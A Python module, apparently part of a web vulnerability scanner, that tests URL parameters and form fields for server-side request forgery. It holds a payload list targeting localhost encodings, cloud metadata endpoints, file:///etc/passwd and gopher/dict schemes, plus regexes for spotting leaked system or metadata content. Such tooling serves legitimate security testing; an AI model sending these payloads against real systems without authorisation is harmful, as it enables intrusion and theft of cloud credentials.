import logging
from urllib.parse import urlparse, parse_qs, quote
from ..http_client import HttpClient
import re
from typing import List, Dict, Optional, Union
import socket
import ipaddress

logger = logging.getLogger(__name__)

class SSRFScanner:
    def __init__(self, client=None):
        self.client = client if client else HttpClient()
        
        # Payloads for SSRF testing
        self.payloads = [
            # Basic localhost references
            "http://localhost/",
            "http://127.0.0.1/",
            "http://[::1]/",
            "http://0.0.0.0/",
            
            # IP-based bypasses
            "http://127.1/",
            "http://0/",
            "http://2130706433/", # Decimal representation of 127.0.0.1
            "http://0177.0000.0000.0001/", # Octal representation
            "http://0x7f.0x0.0x0.0x1/", # Hex representation
            
            # DNS rebinding payloads
            "http://example.com.attacker-controlled-domain.com/",
            
            # Cloud metadata endpoints
            "http://169.254.169.254/latest/meta-data/",  # AWS
            "http://metadata.google.internal/",          # GCP
            "http://169.254.169.254/metadata/v1/",      # DigitalOcean
            "http://169.254.169.254/metadata/instance/", # Azure
            
            # Protocol-based bypasses
            "file:///etc/passwd",
            "dict://localhost:11211/stats",
            "gopher://localhost:25/",
            "ftp://localhost/",
            
            # URL schemes with credentials
            "http://user:password@localhost/",
            
            # DNS rebinding with time-based payload
            "http://attacker-rebind-dns-server.com/"
        ]
        
        # Patterns that might indicate a successful SSRF
        self.ssrf_patterns = [
            # Common system file content patterns
            r"root:.*:0:0:",                       # /etc/passwd
            r"localhost.*127\.0\.0\.1",            # /etc/hosts
            r"DOCUMENT_ROOT=",                     # Environment variables
            r"HTTP_USER_AGENT=",                   # Environment variables
            
            # Cloud metadata responses
            r"ami-id",                             # AWS metadata
            r"instance-id",                        # AWS metadata
            r"iam",                                # AWS IAM
            r"compute\.googleapis\.com",           # GCP metadata
            r"metadata\.google\.internal",         # GCP metadata
            r"metadata\.azure\.com",               # Azure metadata
            
            # Database/service responses
            r"MySQL server version",               # MySQL
            r"PostgreSQL",                         # PostgreSQL
            r"Redis",                              # Redis
            r"MongoDB",                            # MongoDB
            r"memcached",                          # Memcached
            r"SMTP",                               # SMTP
            r"FTP",                                # FTP
            
            # Error messages that might reveal SSRF
            r"Connection refused",                 # Failed connection
            r"No route to host",                   # Failed connection
            r"Network is unreachable",             # Failed connection
            r"Connection timed out",               # Timeout
            r"couldn't connect to host",           # Failed connection
            
            # Internal IP address patterns
            r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}",     # 10.0.0.0/8
            r"172\.(1[6-9]|2\d|3[0-1])\.\d{1,3}\.\d{1,3}", # 172.16.0.0/12
            r"192\.168\.\d{1,3}\.\d{1,3}",         # 192.168.0.0/16
            r"127\.\d{1,3}\.\d{1,3}\.\d{1,3}"      # 127.0.0.0/8
        ]
        
        # Private IP ranges for validation
        self.private_ip_ranges = [
            ipaddress.ip_network('10.0.0.0/8'),
            ipaddress.ip_network('172.16.0.0/12'),
            ipaddress.ip_network('192.168.0.0/16'),
            ipaddress.ip_network('127.0.0.0/8'),
            ipaddress.ip_network('169.254.0.0/16'),
            ipaddress.ip_network('::1/128'),       # IPv6 localhost
            ipaddress.ip_network('fc00::/7')       # IPv6 private range
        ]

    def scan(self, url: str, forms: Optional[List[Dict]] = None) -> List[Dict]:
        vulnerabilities = []
        
        try:
            # Check URL parameters
            parsed = urlparse(url)
            params = parse_qs(parsed.query)
            
            # Look for URL parameters that might be vulnerable to SSRF
            ssrf_prone_params = self._identify_ssrf_prone_params(params)
            
            if params:
                for param in params:
                    # Prioritize suspicious parameters
                    if param in ssrf_prone_params:
                        for payload in self.payloads:
                            try:
                                test_url = self._inject_payload(url, param, payload)
                                response = self.client.get(test_url, timeout=5)
                                
                                if response and self._is_vulnerable(response.text, payload):
                                    vulnerabilities.append({
                                        'type': 'SSRF',
                                        'url': test_url,
                                        'payload': payload,
                                        'evidence': self._get_evidence(response.text, payload),
                                        'severity': 'high',
                                        'param': param,
                                        'method': 'GET'
                                    })
                            except Exception as e:
                                logger.error(f"SSRF GET scan error for {url}: {str(e)}")
            
            # Check forms
            if forms:
                for form in forms:
                    try:
                        form_fields = form.get('fields', [])
                        if not isinstance(form_fields, list):
                            logger.warning(f"Invalid form fields type: {type(form_fields)}")
                            continue
                        
                        method = form.get('method', 'POST').upper()
                        action = form.get('action', '')
                        if not action:
                            logger.warning("Form has no action URL")
                            continue
                        
                        # Find fields that might be vulnerable to SSRF
                        ssrf_prone_fields = self._identify_ssrf_prone_fields(form_fields)
                        
                        for field in form_fields:
                            field_name = field.get('name') if isinstance(field, dict) else field
                            
                            # Prioritize suspicious fields
                            if field_name in ssrf_prone_fields:
                                for payload in self.payloads:
                                    try:
                                        test_data = {}
                                        for f in form_fields:
                                            f_name = f.get('name') if isinstance(f, dict) else f
                                            test_data[f_name] = payload if f_name == field_name else 'test'
                                        
                                        if method == 'POST':
                                            response = self.client.post(action, data=test_data, timeout=5)
                                        elif method == 'GET':
                                            response = self.client.get(action, params=test_data, timeout=5)
                                        else:
                                            logger.warning(f"Unsupported form method: {method}")
                                            continue
                                        
                                        if response and self._is_vulnerable(response.text, payload):
                                            vulnerabilities.append({
                                                'type': 'SSRF',
                                                'url': action,
                                                'payload': payload,
                                                'evidence': self._get_evidence(response.text, payload),
                                                'severity': 'high',
                                                'param': field_name,
                                                'method': method
                                            })
                                    except Exception as e:
                                        logger.error(f"SSRF form scan error for field {field_name}: {str(e)}")
                    except Exception as e:
                        logger.error(f"SSRF form scan error: {str(e)}")
        
        except Exception as e:
            logger.error(f"SSRF scan error: {str(e)}")
        
        return vulnerabilities

    def _inject_payload(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        query[param] = [payload]
        new_query = '&'.join(f"{k}={quote(v[0])}" for k, v in query.items())
        return f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"

    def _is_vulnerable(self, response_text: str, payload: str) -> bool:
        # Check for patterns that indicate successful SSRF
        for pattern in self.ssrf_patterns:
            if re.search(pattern, response_text, re.IGNORECASE):
                return True
                
        # Additional checks based on payload type
        if "localhost" in payload or "127.0.0.1" in payload:
            # Look for signs of a successful local connection
            if "localhost" in response_text or "127.0.0.1" in response_text:
                return True
                
        # Check for cloud metadata specific responses
        if "169.254.169.254" in payload:
            if any(term in response_text for term in ["ami-id", "instance-id", "security-credentials"]):
                return True
                
        return False

    def _get_evidence(self, response_text: str, payload: str) -> str:
        # Extract evidence of SSRF vulnerability
        for pattern in self.ssrf_patterns:
            match = re.search(pattern, response_text, re.IGNORECASE)
            if match:
                return f"SSRF pattern detected: {match.group(0)}"
                
        # If we couldn't find a specific pattern but determined it's vulnerable
        if "localhost" in payload or "127.0.0.1" in payload:
            if "localhost" in response_text or "127.0.0.1" in response_text:
                return "Local server information leaked in response"
                
        # Cloud metadata specific evidence
        if "169.254.169.254" in payload:
            if any(term in response_text for term in ["ami-id", "instance-id", "security-credentials"]):
                return "Cloud instance metadata exposed"
                
        return "SSRF vulnerability detected through response analysis"

    def _identify_ssrf_prone_params(self, params: Dict) -> List[str]:
        """Identify parameters that are likely to be vulnerable to SSRF"""
        ssrf_prone_params = []
        
        suspicious_names = [
            'url', 'uri', 'link', 'src', 'source', 'dest', 'destination',
            'redirect', 'redirect_to', 'redirect_uri', 'return_url', 'return_to',
            'callback', 'callback_url', 'target', 'target_url', 'path', 'load',
            'file', 'filename', 'domain', 'host', 'port', 'ip', 'addr', 'address',
            'fetch', 'resource', 'endpoint', 'proxy', 'location', 'site'
        ]
        
        for param in params:
            param_lower = param.lower()
            
            # Check if parameter name suggests URL or resource loading
            if any(suspicious in param_lower for suspicious in suspicious_names):
                ssrf_prone_params.append(param)
                
            # Check if parameter value looks like a URL or IP
            for value in params[param]:
                if self._is_url_or_ip(value):
                    ssrf_prone_params.append(param)
                    break
                    
        return ssrf_prone_params

    def _identify_ssrf_prone_fields(self, fields: List) -> List[str]:
        """Identify form fields that are likely to be vulnerable to SSRF"""
        ssrf_prone_fields = []
        
        suspicious_names = [
            'url', 'uri', 'link', 'src', 'source', 'dest', 'destination',
            'redirect', 'redirect_to', 'redirect_uri', 'return_url', 'return_to',
            'callback', 'callback_url', 'target', 'target_url', 'path', 'load',
            'file', 'filename', 'domain', 'host', 'port', 'ip', 'addr', 'address',
            'fetch', 'resource', 'endpoint', 'proxy', 'location', 'site'
        ]
        
        for field in fields:
            field_name = field.get('name') if isinstance(field, dict) else field
            if not field_name:
                continue
                
            field_lower = field_name.lower()
            
            # Check if field name suggests URL or resource loading
            if any(suspicious in field_lower for suspicious in suspicious_names):
                ssrf_prone_fields.append(field_name)
                
        return ssrf_prone_fields

    def _is_url_or_ip(self, value: str) -> bool:
        """Check if a string looks like a URL or IP address"""
        # Check if it's a URL
        if value.startswith(('http://', 'https://', 'ftp://', 'file://')):
            return True
            
        # Check if it's an IP address
        try:
            ipaddress.ip_address(value)
            return True
        except ValueError:
            pass
            
        # Check if it's a hostname with a domain
        if '.' in value and not value.startswith('.') and not value.endswith('.'):
            try:
                socket.gethostbyname(value)
                return True
            except socket.error:
                pass
                
        return False

    def _is_private_ip(self, ip_str: str) -> bool:
        """Check if an IP address is in a private range"""
        try:
            ip = ipaddress.ip_address(ip_str)
            return any(ip in network for network in self.private_ip_ranges)
        except ValueError:
            return False
